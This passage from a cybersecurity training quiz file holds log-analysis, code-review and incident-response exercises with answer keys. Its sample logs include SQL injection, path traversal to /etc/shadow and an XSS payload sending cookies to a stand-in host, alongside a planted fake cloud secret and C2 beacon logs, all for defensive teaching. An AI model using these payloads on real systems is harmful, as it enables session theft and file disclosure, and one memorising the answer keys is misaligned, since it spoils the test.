"probe":"re-scan"},{"k":"Watchlist (KEV)","probe":"kev"},{"k":"Vulnerability exception","probe":"exception"}]},{"theme":"Attack Frameworks (obj 3.1)","items":[{"k":"MITRE ATT&CK","probe":"att&ck"},{"k":"TTP","probe":"ttp"},{"k":"Cyber Kill Chain","probe":"kill chain"},{"k":"Kill chain phases (7)","probe":"reconnaissance"},{"k":"Diamond Model","probe":"diamond"},{"k":"IOC","probe":"ioc"},{"k":"IOA","probe":"ioa"},{"k":"Break the chain early","probe":"the chain"}]}],"exercises":[{"id":"H01","t":"Two attackers, one log","type":"logviewer","pts":4,"themes":["Secure Coding","Attack Frameworks"],"kw":["SQL injection","XSS","Path traversal","IOC","Log analysis","Input validation"],"scenario":"Morning shift, no WAF in block mode, so raw access logs are your ground truth. Two source IPs are worth a look: 198[.]51[.]100[.]77 and 203[.]0[.]113[.]99. Everything else looks like routine traffic.","question":"Use the filter box, decode the payloads, compare sizes and statuses, then complete the shift note.","logs":[{"t":"198[.]51[.]100[.]77 - - [03/Jun/2026:04:02:11 +0000] \"GET /shop/item?id=42 HTTP/1.1\" 200 5210","lvl":"info"},{"t":"198[.]51[.]100[.]77 - - [03/Jun/2026:04:02:29 +0000] \"GET /shop/item?id=42%27%20OR%201%3D1-- HTTP/1.1\" 500 903","lvl":"warn"},{"t":"198[.]51[.]100[.]77 - - [03/Jun/2026:04:02:47 +0000] \"GET /shop/item?id=42 HTTP/1.1\" 200 5210","lvl":"info"},{"t":"198[.]51[.]100[.]77 - - [03/Jun/2026:04:03:10 +0000] \"GET /shop/item?id=42%20UNION%20SELECT%20card%2Ccvv%20FROM%20payments HTTP/1.1\" 500 903","lvl":"err"},{"t":"203[.]0[.]113[.]99 - - [03/Jun/2026:04:05:02 +0000] \"GET /profile?name=ana HTTP/1.1\" 200 3300","lvl":"info"},{"t":"203[.]0[.]113[.]99 - - [03/Jun/2026:04:05:20 +0000] \"GET /profile?name=%3Cscript%3Efetch(%27hxxp://exfil[.]example/%3Fc%3D%27%2Bdocument.cookie) HTTP/1.1\" 200 3300","lvl":"warn"},{"t":"203[.]0[.]113[.]99 - - [03/Jun/2026:04:05:41 +0000] \"GET /profile?name=%3Cimg%20src%3Dx%20onerror%3Dfetch(HTTP/1.1\" 200 3300","lvl":"warn"},{"t":"203[.]0[.]113[.]99 - - [03/Jun/2026:04:06:03 +0000] \"GET /download?file=..%2f..%2f..%2fetc%2fshadow HTTP/1.1\" 200 18754","lvl":"err"},{"t":"198[.]51[.]100[.]77 - - [03/Jun/2026:04:07:00 +0000] \"GET /shop/item?id=43 HTTP/1.1\" 200 5210","lvl":"info"},{"t":"192[.]0[.]2[.]14 - - [03/Jun/2026:04:07:31 +0000] \"GET /health HTTP/1.1\" 200 12","lvl":"info"}],"sub":{"type":"fill","text":"Distinct source IPs sending attack payloads: {{b1}}. The attack that appears to have SUCCEEDED is the {{b2}}, because it returned 200 with a body far larger than normal. The control that stops it at the application layer is {{b3}}.","bank":["two","three","path traversal","SQL injection","reflected XSS","input validation with canonicalized paths","output encoding on render","HSTS"],"blanks":{"b1":"two","b2":"path traversal","b3":"input validation with canonicalized paths"}},"hint":"Filter on each IP. URL-decode %2f as a slash. Compare response sizes: 5xxx is normal here, 18xxx is not.","expl":"Filtering by IP separates the two stories. 198[.]51[.]100[.]77 probes /shop/item with URL-encoded SQL (%27 is a quote, %3D is =); every probe returns 500, so the injection failed \u2014 the app rejects malformed queries. 203[.]0[.]113[.]99 tries reflected XSS payloads that merely render (200 at normal size, no proof of impact) and then a path traversal: ..%2f..%2f..%2fetc%2fshadow is ../../../etc/shadow, and the 200 with a roughly 18 KB body against a 3 KB baseline says the file content came back \u2014 a successful traversal. Two distinct attacker IPs. Canonicalizing paths with input validation stops traversal at the app layer; output encoding addresses the XSS; HSTS is unrelated to any of this.","focus":"Decode payloads, then read status plus size together. A big 200 after a traversal probe means the file left the building."},{"id":"H02","t":"Manual static sweep","type":"terminal","pts":3,"themes":["Security Testing","Secure Coding"],"kw":["SAST","SQL injection","Code review","Parameterized queries"],"scenario":"Audit sign-off is Friday and the automated SAST run is queued behind a broken scanner license. You fall back to the oldest tool in the box: your own command line on the source tree.","question":"In the lab shell: find every line under src/ that contains a SELECT statement, with line numbers. The tool and flags are yours to choose \u2014 state the goal is what matters.","fs":{"src/orders.py":"def find(uid):\n    q = \"SELECT * FROM orders WHERE uid = \" + uid\n    return db.execute(q)\n","src/safe_search.py":"def find(term):\n    q = \"SELECT * FROM orders WHERE note LIKE ?\"\n    return db.execute(q, (\"%\" + term + \"%\",))\n","src/reports.py":"def month(m):\n    q = \"SELECT count(*) FROM events WHERE m = \" + m\n    return db.execute(q)\n"},"demoCmd":"grep -rn SELECT src/","checks":[{"re":"\\b(grep|rg)\\b","label":"Uses a text-search tool (grep or rg)"},{"re":"(^|\\s)-\\w*r|\\brg\\b","label":"Searches recursively (-r, or rg which recurses by default)"},{"re":"(^|\\s)-\\w*n","label":"Shows line numbers"},{"re":"src\\b","label":"Targets the src/ tree"}],"success":[{"re":"(grep|rg)\\s+[^\\n]*select[^\\n]*src\\b","out":"src/orders.py:2:    q = \"SELECT * FROM orders WHERE uid = \" + uid\nsrc/reports.py:2:    q = \"SELECT count(*) FROM events WHERE m = \" + m\nsrc/safe_search.py:2:    q = \"SELECT * FROM orders WHERE note LIKE ?\""}],"hint":"No tool name this time \u2014 pick your own text search. It must recurse, number lines, and point at src/.","expl":"grep -rn SELECT src/ (or rg -n) lists every query line with file and line number \u2014 you are the SAST engine for five minutes. orders.py and reports.py glue user input straight into the SQL string, so they are vulnerable to SQL injection. safe_search.py passes the term as a bound parameter, so query and data travel separately \u2014 that one is safe. This manual sweep finds the exact lines a fix should touch, which is why auditors love it; the automated static analysis will confirm it later.","focus":"Vulnerable = data concatenated into the query string. Safe = placeholders or bound parameters."},{"id":"H03","t":"Which phase is it now?","type":"qcm","pts":3,"themes":["Attack Frameworks"],"kw":["Cyber Kill Chain","Weaponization","Break the chain early"],"scenario":"Threat intel briefing: an actor registered the domain docs-portal[.]example, built a Word template carrying an exploit for CVE-2026-3333, and uploaded it to that domain. Your proxy logs show nobody has downloaded anything from it yet.","question":"Which Cyber Kill Chain phase is the attacker in?","choices":["Weaponization","Reconnaissance","Delivery","Exploitation"],"correct":[0],"hint":"The payload exists and waits. Nothing has been sent, nobody has opened it. What has already happened \u2014 and only that?","expl":"Coupling an exploit into a deliverable payload and staging it is weaponization, phase two. Reconnaissance is about gathering target information and is not described here. Delivery has not happened: no victim has downloaded the file, so phase three has not begun, and exploitation and installation require a victim to trigger the payload. The distinction matters operationally \u2014 blocking the domain now breaks the chain at the cheapest possible point, before any victim is exposed.","focus":"No recipient yet = not delivery. Payload built and staged = weaponization."},{"id":"H04","t":"Import service on fire","type":"branch","pts":4,"themes":["Secure Coding","Vulnerability Response"],"kw":["Insecure deserialization","Containment","Mitigation","Eradication","Secrets management","IOC","Sandboxing"],"scenario":"21:12. Alert: the document-import service (Java) threw repeated ClassCastException errors, then opened an outbound connection to 185[.]199[.]110[.]153:443. The service accepts user uploads and deserializes legacy ObjectInputStream payloads. You are first responder. Work the incident.","question":"Choose the right action at every step.","steps":[{"text":"Your first move as responder?","opts":[{"t":"Isolate the affected instance from the load balancer; keep memory and logs for forensics","ok":true,"note":"Right: contain first, preserve evidence second, and never reboot before capture."},{"t":"Reboot the host to clear the malware","ok":false,"note":"Rebooting destroys volatile evidence and may trigger watcher malware \u2014 contain, do not wipe."},{"t":"Keep serving traffic and watch what happens","ok":false,"note":"An active RCE beaconing outward is not a spectator sport \u2014 pull it from rotation now."}]},{"text":"Confirmed: gadget-chain deserialization RCE. Containment?","opts":[{"t":"Block egress to the C2, take the import endpoint offline via WAF rule, run future imports in a sandboxed worker","ok":true,"note":"Good: cut the channel, kill the entry point, isolate future execution."},{"t":"Patch the library next sprint","ok":false,"note":"Next sprint leaves an internet-reachable RCE live \u2014 mitigation cannot wait for remediation."},{"t":"Firewall the attacker IP","ok":false,"note":"One IP is trivially rotated; remove the flaw's reachability, not the visitor."}]},{"text":"Eradication and recovery?","opts":[{"t":"Upgrade the deserialization library, replace native ObjectInputStream with schema-validated JSON, rotate service credentials","ok":true,"note":"Correct: remove the flaw class and assume every credential on the host is burned."},{"t":"Restore from last night's backup","ok":false,"note":"Backups restore data, not root cause \u2014 the flaw is in the code path, not the data."},{"t":"Whitelist the import endpoint for internal users only","ok":false,"note":"Useful hardening, but the gadget chain remains \u2014 anyone inside the VPN still owns you."}]},{"text":"Before you close the incident?","opts":[{"t":"Hunt logs for earlier exploitation, rotate all secrets the host held, add the payload to regression tests","ok":true,"note":"Complete: scope backwards, rotate credentials, prevent a repeat."},{"t":"Close it \u2014 containment worked","ok":false,"note":"Without scoping and credential rotation you may re-open this incident next week."},{"t":"Only re-scan the host","ok":false,"note":"A scanner will not tell you whether the attacker already read the secrets store."}]}],"hint":"Contain, eradicate, recover, scope. Evidence and credentials are the patient's close contacts.","expl":"Deserialization of untrusted data with a gadget chain is a full remote code execution: serialization errors followed by an outbound beacon is the giveaway pattern. Response order: contain (pull from the load balancer, cut egress, disable the endpoint), eradicate (replace the flawed code path and validate the fix), recover, and scope backwards \u2014 hunt for earlier beacons and rotate every credential the host could read. Blocking one IP or rebooting loses to a competent adversary; replacing native deserialization with schema-validated JSON removes the entire bug class.","focus":"RCE handling = contain fast, replace the flaw, rotate credentials, hunt history."},{"id":"H05","t":"Pipeline code review","type":"spot","pts":4,"themes":["CI/CD & Supply Chain"],"kw":["Secrets management","Container image scanning","SCA","Security gates","Least privilege","CI/CD pipeline","Shift-left"],"scenario":"Shift-left review of the DevOps team's build pipeline for the shop service. You read the pipeline file the way an attacker would \u2014 looking for what it trusts.","question":"Click every line that contains a security flaw.","code":[{"t":"pipeline:"},{"t":"  agent: any"},{"t":"  environment:"},{"t":"    AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCY'","bad":true,"why":"Plain-text cloud secret in the pipeline file \u2014 belongs in a secrets vault."},{"t":"  steps:"},{"t":"    - build: docker build -t shop:latest .","bad":true,"why":"Unpinned :latest tag \u2014 builds are not reproducible; pin digests."},{"t":"    - test: run unit tests and integration suites"},{"t":"    - sca: scan dependencies for CVEs   # disabled while flaky","bad":true,"why":"The SCA gate is switched off \u2014 vulnerable components sail through."},{"t":"    - image_scan_enabled: false","bad":true,"why":"Container image scanning disabled \u2014 no CVE gate on the artifact."},{"t":"    - deploy: docker run --privileged shop:latest","bad":true,"why":"A privileged container breaks out easily \u2014 least privilege violation."},{"t":"    - notify: slack channel"}],"hint":"One line hides a cloud secret, two switches are off, one image floats, one container is too powerful.","expl":"Five flaws in eleven lines. The AWS key is a hard-coded credential sitting in plain text \u2014 the repository keeps every version of this file forever, so secrets belong in a vault and never in code. Building shop:latest makes builds unreproducible; pin versions or digests. Commenting out the SCA scan and disabling container image scanning removes two security gates, so vulnerable dependencies and vulnerable images ship silently. And --privileged gives the container near-root power over the host, the opposite of least privilege. Pipelines are code: review them like code, because attackers do.","focus":"Pipeline review checklist: no plaintext secrets, pinned images, gates on, no privileged containers."},{"id":"H06","t":"Shrink the surface","type":"multi","pts":3,"themes":["Threat Modeling & Architecture"],"kw":["Attack surface","Secure defaults","Hardening","Waterfall"],"scenario":"Hardening sprint for the public booking API. Current state: a /debug endpoint live in production, management port 8080 reachable from the internet, a legacy /api/v1 still routed but unused, verbose stack traces on errors, TLS 1.0 enabled, a WAF in front, log retention 90 days.","question":"Select every change that REDUCES the attack surface.","choices":["Remove the /debug endpoint from the production build","Close management port 8080 to the internet","Retire the unused legacy /api/v1 routes","Disable TLS 1.0 and the verbose stack traces","Add another WAF rule set in front of the app","Raise log retention to 180 days","Run one big waterfall-style hardening phase at year end"],"correct":[0,1,2,3],"hint":"Reducing the surface means removing or closing things. Controls that watch or filter do not shrink it.","expl":"Attack surface is the sum of what an attacker can touch: endpoints, ports, protocols, features. Removing /debug, closing 8080, retiring dead routes and turning off TLS 1.0 plus stack traces all take targets away \u2014 that is reduction, and it is how secure defaults are built in. WAF rules and more logging are useful mitigations and detection improvements, but everything they watch still exists. A once-a-year hardening phase is a process choice, not a surface change \u2014 the dead endpoints would sit exposed all year. When a question says 'reduce the attack surface', look for the delete, close and disable answers.","focus":"Surface reduction = remove, close, disable. Everything else is mitigation or detection."},{"id":"H07","t":"DREAD under pressure","type":"match","pts":3,"themes":["Threat Modeling & Architecture"],"kw":["DREAD","Risk scoring"],"scenario":"The architecture board is scoring five statements about one payment platform. Each statement measures exactly one DREAD dimension.","question":"Match each statement to the DREAD dimension it describes.","left":[{"k":"q1","t":"The exploit only works while the Tuesday batch job is running"},{"k":"q2","t":"A successful attack can wipe the payments database"},{"k":"q3","t":"Needs no credentials and a ten-line script"},{"k":"q4","t":"All 300,000 customer accounts sit in the blast radius"},{"k":"q5","t":"The vulnerable admin page is linked from a public search result"}],"right":[{"k":"q1","t":"Reproducibility (low)"},{"k":"q2","t":"Damage (max)"},{"k":"q3","t":"Exploitability (max)"},{"k":"q4","t":"Affected users (max)"},{"k":"q5","t":"Discoverability (high)"}],"hint":"Each sentence measures exactly one letter. Ask: how much harm, how reliably it repeats, how little effort it takes, how many users, how easy to find?","expl":"DREAD scoring maps each sentence to one letter. 'Only while the batch job runs' is about how reliably the attack repeats \u2014 Reproducibility, and it is low. 'Wipe the payments database' measures impact \u2014 Damage, maximal. 'No credentials, ten-line script' measures the skill bar \u2014 Exploitability, maximal. '300,000 accounts' is the blast radius \u2014 Affected users. 'Linked from a public search result' is how easily attackers find it \u2014 Discoverability, high. The scoring value is that each letter has a measurable question behind it, so two analysts usually land within a point of each other.","focus":"One sentence, one letter: impact = D, repeatability = R, effort = E, blast radius = A, findability = D."},{"id":"H08","t":"One window, six findings","type":"order","pts":4,"themes":["Vulnerability Response"],"kw":["CVSS","Prioritization","Watchlist","Exposure","Compensating controls","Patch management","KEV"],"scenario":"Six findings, one maintenance window tonight. Context beats the raw score. (A) CVSS 8.6 auth bypass, internet-facing, listed in KEV; (B) CVSS 9.8 RCE on an isolated lab network with no production data; (C) CVSS 8.2 SQLi on the payment API, internet-facing, PCI deadline in 10 days; (D) CVSS 5.0 XSS on the internal HR wiki; (E) CVSS 7.2 privilege escalation on a jump host shared by 30 admins; (F) CVSS 6.5 info leak on a decommissioned host scheduled for deletion on Friday.","question":"Drag the six findings into remediation order \u2014 first at the top.","items":["A \u2014 internet-facing, actively exploited (KEV)","C \u2014 payment API, internet-facing, regulatory clock","E \u2014 jump host with 30 admin accounts at stake","B \u2014 CVSS 9.8, but isolated lab with no crown jewels","F \u2014 dying host, deleted Friday, monitored until then","D \u2014 internal wiki XSS, low impact"],"hint":"Two questions reorder everything: who can reach it, and is it being exploited right now?","expl":"Context reorders the queue. The KEV-listed, internet-facing auth bypass goes first despite scoring 8.6: active exploitation plus full exposure. The payment API follows \u2014 internet-facing and a regulatory deadline. The jump host comes third: thirty admin sessions make it a domain-wide risk. The 9.8 lab RCE waits: exploitability is real, but that network holds no production data. The dying host is monitored until deletion on Friday. The wiki XSS is last. A pure CVSS sort would have burned the window on the lab RCE \u2014 the least valuable target. This is patch management as judgment, not arithmetic.","focus":"Order = exposure x active exploitation x business weight, with CVSS as the tie-breaker."},{"id":"H09","t":"Pass the exception board","type":"fill","pts":3,"themes":["Vulnerability Response"],"kw":["Risk acceptance","Risk transfer","Remediation","Mitigation","Compensating controls","Risk owner","Vulnerability exception"],"scenario":"The architecture exception board reviews requests to keep shipping on an unsupported OS build agent until Q3. Your first two drafts were rejected for vocabulary. Write the version that passes \u2014 three bank words are deliberately wrong for some gaps.","question":"Fill every gap correctly.","text":"Request: formal risk {{b1}} for CVE-2026-4410 on BUILD-AGT-04 until 30 September. The vendor EOL means no patch will ever exist, so {{b2}} is impossible; we apply segmentation plus an allowlist as a {{b3}}. Approval sits with the {{b4}}, and the exception carries a 90-day review, not an {{b5}} waiver.","bank":["acceptance","transfer","remediation","mitigation","compensating control","risk owner","indefinite","annual"],"blanks":{"b1":"acceptance","b2":"remediation","b3":"compensating control","b4":"risk owner","b5":"indefinite"},"hint":"You cannot fix an EOL product \u2014 that kills one word. Insurance wording kills another. 'Forever' kills a third.","expl":"Vocabulary is the exam here. Remediation means removing the vulnerability \u2014 impossible with vendor-EOL software. Mitigation means reducing exposure, which is exactly what the segmentation does, so it lives in the compensating-control slot. Acceptance means the organization knowingly keeps the risk and signs it \u2014 correct for an unpatchable, contained asset. Transfer means paying another party, such as an insurer, to carry the financial impact \u2014 it removes nothing and fits no gap here. And exceptions expire: an indefinite waiver is how audit findings get written up. Owner, control, expiry \u2014 the three legs of a defensible exception.","focus":"Remediation vs mitigation vs acceptance vs transfer \u2014 pick by what physically happens, not by vibes."},{"id":"H10","t":"Tactics on the wall","type":"dragdrop","pts":4,"themes":["Attack Frameworks"],"kw":["MITRE ATT&CK","Tactics","TTP","Exfiltration"],"scenario":"You are building the ATT&CK heat map for the quarterly review. Each observed artifact from the year's incidents belongs under exactly one tactic \u2014 the adversary's goal, not the mechanism.","question":"Drag each observed behavior onto the tactic it serves.","slots":[{"k":"ia","t":"Tactic: Initial Access"},{"k":"ex","t":"Tactic: Execution"},{"k":"pe","t":"Tactic: Persistence"},{"k":"ca","t":"Tactic: Credential Access"},{"k":"c2","t":"Tactic: Command and Control"},{"k":"exf","t":"Tactic: Exfiltration"}],"items":[{"k":"ia","t":"Spearphishing attachment with a macro loader"},{"k":"ex","t":"Encoded PowerShell one-liner on the beachhead"},{"k":"pe","t":"Registry Run key added for the implant"},{"k":"ca","t":"LSASS memory dumping via comsvcs.dll"},{"k":"c2","t":"HTTPS beacon to hxxp://cdn-live[.]example every 60s"},{"k":"exf","t":"Archives the finance share and uploads it"}],"hint":"Tactics are the WHY. Ask what the adversary achieves with each behavior.","expl":"ATT&CK tactics are the adversary's goal; techniques are the how \u2014 together they form the TTP picture. The macro document gets them in the door: Initial Access. The PowerShell one-liner runs their code: Execution. The Run key survives reboots: Persistence. Dumping LSASS harvests credentials: Credential Access. The sixty-second HTTPS beacon is Command and Control. Packing and uploading the finance share is Exfiltration. Reading incident artifacts as goal-then-behavior pairs is what makes ATT&CK reports, heat maps and hunts line up across teams.","focus":"Goal column (tactic) versus verb column (technique). Survives a reboot = Persistence, whatever the mechanism."},{"id":"H11","t":"The heartbeat on WS-2214","type":"logviewer","pts":4,"themes":["Attack Frameworks"],"kw":["C2","IOC","MITRE ATT&CK","Containment","Escalation"],"scenario":"One hour of egress proxy logs. Workstation WS-2214 (10[.]20[.]4[.]114) is on your screen after a data-loss alert fired at 09:14.","question":"Filter to WS-2214, read the rhythm and the sizes, then complete the report.","logs":[{"t":"09:00:01 WS-2214 GET hxxp://intranet[.]local/portal 200 4.1KB","lvl":"info"},{"t":"09:01:02 WS-2214 POST hxxp://cdn-metrics[.]example/beacon 200 0.3KB","lvl":"info"},{"t":"09:02:03 WS-2214 POST hxxp://cdn-metrics[.]example/beacon 200 0.3KB","lvl":"info"},{"t":"09:03:01 WS-2214 GET hxxp://intranet[.]local/portal 200 4.1KB","lvl":"info"},{"t":"09:04:02 WS-2214 POST hxxp://cdn-metrics[.]example/beacon 200 0.3KB","lvl":"info"},{"t":"09:05:03 WS-2214 POST hxxp://cdn-metrics[.]example/beacon 200 0.3KB","lvl":"info"},{"t":"09:06:02 WS-2214 POST hxxp://cdn-metrics[.]example/beacon 200 0.3KB","lvl":"info"},{"t":"09:07:03 WS-2214 GET hxxp://intranet[.]local/wiki 200 3.0KB","lvl":"info"},{"t":"09:08:02 WS-2214 POST hxxp://cdn-metrics[.]example/beacon 200 0.3KB","lvl":"info"},{"t":"09:09:03 WS-2214 POST hxxp://cdn-metrics[.]example/beacon 200 0.3KB","lvl":"info"},{"t":"09:10:01 WS-2214 POST hxxp://cdn-metrics[.]example/beacon 200 0.3KB","lvl":"info"},{"t":"09:11:02 WS-2214 POST hxxp://cdn-metrics[.]example/beacon 200 0.3KB","lvl":"info"},{"t":"09:12:03 WS-2214 POST hxxp://cdn-metrics[.]example/beacon 200 0.3KB","lvl":"info"},{"t":"09:13:02 WS-2214 GET hxxp://intranet[.]local/portal 200 4.1KB","lvl":"info"},{"t":"09:14:02 WS-2214 POST hxxp://cdn-metrics[.]example/beacon 200 2.1MB","lvl":"err"},{"t":"09:15:03 WS-2214 POST hxxp://cdn-metrics[.]example/beacon 200 0.3KB","lvl":"info"}],"sub":{"type":"fill","text":"Filter to WS-2214. The beacon interval is about {{b1}}. This periodic web callback matches MITRE technique {{b2}}. First containment: {{b3}}.","bank":["60 seconds","5 seconds","15 minutes","1 hour","T1071 \u2014 Application Layer Protocol (web)","T1110 \u2014 Brute Force","T1053 \u2014 Scheduled Task","block the domain and isolate the host","reboot the workstation","email the user a warning"],"blanks":{"b1":"60 seconds","b2":"T1071 \u2014 Application Layer Protocol (web)","b3":"block the domain and isolate the host"}},"hint":"Filter the box to WS-2214 and read the /beacon timestamps. Size 0.3KB over and over is a heartbeat; one 2.1MB is not.","expl":"Filtering to WS-2214 shows a POST to the same URL roughly every 60 seconds with jitter \u2014 a heartbeat, the signature of command-and-control beaconing over plain web traffic, which maps to T1071, Application Layer Protocol. The single 2.1MB POST at 09:14 is what fired the data-loss alert: likely exfiltration riding the same channel. Containment is to block the domain at the proxy and isolate the workstation, then escalate to IR \u2014 rebooting only destroys memory evidence, and warning the user tips off a possible insider. The domain and URL pattern become IOCs for an estate-wide hunt.","focus":"Regular POST + tiny responses + one huge POST = beacon plus exfil. T1071 for web C2."},{"id":"H12","t":"Fix the login session","type":"qcm","pts":3,"themes":["Secure Coding"],"kw":["Session management","Secure cookie flags","CSRF"],"scenario":"Code review of the login flow: the app regenerates the session ID after authentication (good), but it also accepts a session ID supplied in the URL (?sid=...) and reuses it. Cookies are flagged HttpOnly but not Secure and not SameSite.","question":"Which fix addresses the REAL risk?","choices":["Reject URL-supplied session IDs and set Secure + SameSite","Regenerate the session ID a second time right after login","Add a CSRF token to the login and password-reset forms","Shorten the session timeout from 24 hours to 10 minutes"],"correct":[0],"hint":"Regeneration already happens. The attacker's trick is planting an ID before login \u2014 where does the app let them?","expl":"Accepting an attacker-chosen session ID from the URL enables session fixation: the victim logs in while the attacker already knows the ID. Server-side generation kills the flaw, and the Secure and SameSite cookie flags close the plaintext-leak and cross-site-carry gaps. Regenerating again is redundant \u2014 it already happens once, at the right moment. A CSRF token defends cross-site request forgery, which is a different problem class. A shorter timeout shrinks the window but leaves the fixation mechanism fully intact. Fix the acceptance of external IDs; everything else is secondary hardening.","focus":"Fixation = attacker plants the ID. Only server-side generation plus flag hygiene fixes it."},{"id":"H13","t":"Precision defenses","type":"dragdrop","pts":4,"themes":["Secure Coding"],"kw":["Race condition","SSRF","Insecure deserialization","Path traversal","Error handling","Input validation"],"scenario":"The mentoring session question: generic advice like 'validate input' does not survive a code review. Each flaw needs its mechanism-matched fix.","question":"Drag each fix onto the flaw it actually kills.","slots":[{"k":"race","t":"Race condition on balance check and withdraw"},{"k":"ssrf","t":"SSRF in the PDF generator's URL fetch"},{"k":"deser","t":"Native deserialization of user cookies"},{"k":"trav","t":"Path traversal in /download?file="},{"k":"xxe","t":"XXE in the XML invoice parser"},{"k":"err","t":"Stack traces returned to end users"}],"items":[{"k":"race","t":"Atomic transaction with row-level lock"},{"k":"ssrf","t":"Allowlist destinations; block 169[.]254[.]169[.]254"},{"k":"deser","t":"Schema-validated JSON instead of readObject()"},{"k":"trav","t":"Canonicalize and enforce a base directory"},{"k":"xxe","t":"Disable DTDs and external entities"},{"k":"err","t":"Generic error page; log details server-side"}],"hint":"One is about timing (atomic), one about where fetches may go, one about the parser, one about paths, one about XML features, one about messages.","expl":"Precision beats categories. A race condition dies with an atomic transaction and a lock, so check-and-debit cannot interleave. SSRF dies with an allowlist of fetch destinations and by blocking link-local metadata addresses like 169[.]254[.]169[.]254 \u2014 the cloud credential theft target. Native deserialization dies by moving to schema-validated JSON. Path traversal dies with canonicalization pinned to a base directory. XXE dies by disabling DTDs and external entities in the parser. Stack traces belong in server logs behind a generic error page \u2014 error handling done right, information disclosure prevented.","focus":"Match the mechanism: timing = atomicity, fetches = allowlist, parsers = disable features, paths = canonicalize, messages = log server-side."},{"id":"H14","t":"Why did the scanners miss it?","type":"multi","pts":3,"themes":["Security Testing"],"kw":["False negative","SAST","DAST","SCA","Fuzzing","IAST"],"scenario":"Post-incident review: an SSRF in an authenticated 'fetch URL' feature was exploited for weeks. Neither SAST nor DAST flagged it. The review board lists six candidate explanations \u2014 some are real coverage gaps, some are myths.","question":"Select every explanation that is PLAUSIBLE.","choices":["The feature required an authenticated session the DAST scanner never had","Exploitation needed a multi-step business flow the scanner could not follow","The sink lived in a vendor binary outside the first-party source SAST reads","The payload only fired with 10MB inputs \u2014 no fuzzing existed for that path","SAST can never find SSRF because it does not execute the code","DAST only detects known CVEs by signature"],"correct":[0,1,2,3],"hint":"Two choices contain absolute claims like 'never' and 'only' \u2014 absolutes are usually the lie.","expl":"Scanner gaps are concrete: no authenticated session, flows too deep to follow, sinks hidden in vendor binaries outside the scanned source, and input shapes \u2014 like huge payloads \u2014 that no test ever produced, which is what fuzzing is for. The two absolute claims are myths: SAST regularly finds SSRF by tracing data flow from source to sink without executing anything, and DAST works by probing the running app's behavior, not by matching CVE signatures \u2014 signature matching against feeds is SCA's job. IAST instrumentation plus authenticated, fuzz-fed DAST would have narrowed this gap.","focus":"Coverage gaps are specific: auth, scope, input shapes, vendor code. 'Never' and 'only' are exam traps."},{"id":"H15","t":"Rank the security debt","type":"order","pts":3,"themes":["Vulnerability Response"],"kw":["Compensating controls","Prioritization","Mitigation","Stored XSS"],"scenario":"Security debt review. Rank by RESIDUAL risk \u2014 what remains after the existing controls. (A) RCE on the edge gateway; the WAF rule covers the known exploit but bypasses are published monthly; (B) SQLi on an internal tool; the DB account is read-only; (C) privilege escalation on a container host; runtime policy blocks most escape paths, and the host runs 40 tenants; (D) an open object-storage bucket with test data only, no PII, public listing off; (E) auth bypass on the staging VPN, no production systems behind it; (F) stored XSS on a partner portal used by 200 staff daily.","question":"Drag the six items into remediation order \u2014 worst residual risk first.","items":["A \u2014 RCE at the edge, the one control is bypass-prone","C \u2014 escalation on a multi-tenant host, partial control","F \u2014 stored XSS hitting 200 staff daily","B \u2014 internal SQLi, but read-only database account","E \u2014 staging VPN bypass, nothing valuable behind it","D \u2014 bucket with test data only, listing off"],"hint":"Ask two things per item: how strong is the control really, and what sits behind the flaw?","expl":"Residual risk equals raw risk minus working controls. The edge RCE keeps the top slot: its WAF rule is the only control and bypasses ship monthly \u2014 weak mitigation, total exposure. The multi-tenant container host follows: partial control and a huge blast radius. The partner-portal XSS hits 200 staff daily \u2014 high frequency. The internal SQLi is genuinely held back by a read-only database account, an effective compensating control. Staging and test-data items sit at the bottom: low-value assets behind the flaws. The discipline is writing down what the control actually blocks, never assuming 'WAF' or 'read-only' makes something safe.","focus":"Residual = what the control fails to stop. Control strength, frequency and blast radius decide the order."},{"id":"H16","t":"The worm and the clones","type":"qcm","pts":3,"themes":["CI/CD & Supply Chain"],"kw":["Software diversification","ASLR","Memory safety"],"scenario":"A worm exploited one memory-corruption bug and copied itself across 4,000 identical appliance instances in a single night \u2014 every instance ran the same binary with the same memory layout. The board asks how one flaw can never again take the whole fleet at once.","question":"Which strategy answers the board?","choices":["Diversify the fleet with ASLR, stack canaries and varied compilers","Faster weekly patching across all 4,000 appliance instances","Segment the network so appliances cannot talk to each other","Add a second firewall in front of the appliance pool"],"correct":[0],"hint":"The worm needed every target to look the same. Make the targets different \u2014 the answer is inside that sentence.","expl":"Identical binaries fall to identical exploits. Software diversification breaks the sameness: compiling instances with different compilers or versions, enabling ASLR so memory addresses differ per instance, and adding stack canaries changes what a single exploit blob can do to each target. Faster patching helps, but the same bug returns between cycles and a worm does not wait for patch day. Segmentation and a second firewall are network mitigations \u2014 defense in depth, not diversification \u2014 and do not change whether the exploit succeeds on any host that remains reachable. Diversification attacks the fleet-wide single point of failure directly.","focus":"Diversification = randomness and difference at the binary and layout level: compilers, ASLR, canaries."},{"id":"H17","t":"Poisoned build plugin","type":"order","pts":4,"themes":["CI/CD & Supply Chain"],"kw":["SBOM","Supply chain","Dependency management","Code signing","Containment","Secrets management"],"scenario":"Your internal mirror of an open-source build plugin served a compromised version for six hours before the alert. Several nightly builds ingested it. Work the containment in the right order.","question":"Drag the six response steps into the correct order.","items":["Identify every affected build: query the SBOMs for the plugin version","Freeze the pipeline and revoke build credentials and tokens","Purge the compromised artifact from caches and mirrors","Pin the last trusted version and verify its hash and code-signed artifact","Rebuild affected images and redeploy","Publish an internal advisory and notify downstream teams"],"hint":"Know the blast radius, stop the bleeding, remove the poison, prove the replacement, rebuild, tell people.","expl":"Supply-chain containment starts with blast radius: the SBOMs tell you in minutes which builds ingested the poisoned plugin. Then stop the bleeding \u2014 freeze the pipeline and rotate the build credentials, because the attacker ran code inside your build trust boundary and secrets management must assume the worst. Purge the artifact everywhere it cached. Pin the last trusted version and verify it by hash and code signature before trusting it again. Only then rebuild and redeploy, and finish by advising every downstream team \u2014 advisories turn one incident into estate-wide learning.","focus":"SBOM, then freeze + rotate, purge, verify the pin, rebuild, advise. Speed comes from the SBOM."},{"id":"H18","t":"Write the finding","type":"fill","pts":3,"themes":["Security Testing"],"kw":["Penetration testing","CVSS","SQL injection","Parameterized queries","CWE","Regression testing","Risk register","ORM"],"scenario":"Your penetration test found a critical SQL injection in /api/v2/search with a working proof of concept. Draft the finding text for the tracker \u2014 precise wording matters, the fix team works from it.","question":"Fill every gap with the right term.","text":"Finding: SQL injection in /api/v2/search. Severity: {{b1}} (CVSS 9.1). The endpoint builds the 